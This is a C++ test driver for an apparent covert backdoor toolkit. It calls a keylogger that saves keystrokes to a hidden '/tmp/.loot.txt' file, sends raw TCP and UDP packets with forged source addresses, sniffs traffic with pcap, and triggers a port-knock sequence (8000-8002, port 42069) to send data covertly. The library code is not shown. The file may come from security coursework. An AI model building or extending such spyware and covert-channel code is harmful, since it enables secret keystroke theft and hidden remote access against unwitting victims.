#include <iostream>
#include <string>
#include <vector>

#include <unistd.h>

#include "NetworkEngine.h"
#include "TcpStack.h"
#include "UdpStack.h"
#include "authenticator.h"
#include "crypto.h"

#include "Keylogger.h"

const std::string interfaceName("wlp59s0");
const std::string knockPattern("8000,8001,8002");

const unsigned short knockPort = 42069;
const unsigned int knockDuration = 5;

const short sport = 42069;
const short dport = 7575;

UCharVector data({'a', 'b', 'c', 'd', 'e'});

void testAuth() {
    Authenticator auth;

    std::cout << auth.generateSignature(sport) << std::endl;
    std::cout << auth.generateSignature(dport) << std::endl;
}

void testCrypto() {
    Crypto cryptoEngine("key");

    UCharVector ciphertext = cryptoEngine.enc(data);
    UCharVector plaintext = cryptoEngine.dec(ciphertext);
}

void testKeylogger() {
    Keylogger kl("/tmp/.loot.txt");
    kl.start_logging(); // should be started in another thread
}

void testNet() {
    struct in_addr srcAddr;
    struct in_addr dstAddr;
    srcAddr.s_addr = 0xDEADBEEF;
    dstAddr.s_addr = 0xEFBEADDE;

    NetworkEngine netEngine(interfaceName, knockPattern, knockPort, knockDuration);

    // tcp sending examples
    for (int i = 0; i < 10; i++) {
        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport, TcpStack::SYN_FLAG, data)
                  << std::endl;
        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport,
                                          TcpStack::SYN_FLAG | TcpStack::ACK_FLAG, data)
                  << std::endl;
    }

    // udp sending examples
    for (int i = 0; i < 10; i++) {
        std::cout << netEngine.sendRawUdp(srcAddr, dstAddr, sport, dport, data) << std::endl;
    }

    // adding functions to process payload received from pcap loop
    auto cb1 = [](const pcap_pkthdr *header, const unsigned char *payload,
                  NetworkEngine *) -> void { std::cout << "cb1" << std::endl; };
    auto cb2 = [](const pcap_pkthdr *header, const unsigned char *payload,
                  NetworkEngine *) -> void { std::cout << "cb2" << std::endl; };
    auto cb3 = [](const pcap_pkthdr *header, const unsigned char *payload,
                  NetworkEngine *) -> void { std::cout << "cb3" << std::endl; };
    netEngine.LoopCallbacks.push_back(cb1);
    netEngine.LoopCallbacks.push_back(cb2);
    netEngine.LoopCallbacks.push_back(cb3);

    // example of starting and stopping sniffing
    std::cout << "starting sniff" << std::endl;
    netEngine.startSniff("ip");
    sleep(2);
    std::cout << "stopping sniff" << std::endl;
    netEngine.stopSniff();
}

void testKnock() {
    NetworkEngine netEngine(interfaceName, knockPattern, knockPort, knockDuration);
    netEngine.startSniff("ip and udp");
    netEngine.knockAndSend(*netEngine.getIp(), data);
    netEngine.stopSniff();
}

int main(int argc, char *argv[]) {

    // testAuth();
    // testCrypto();
    // testKeylogger();
    // testNet();
    testKnock();

    return 0;
}
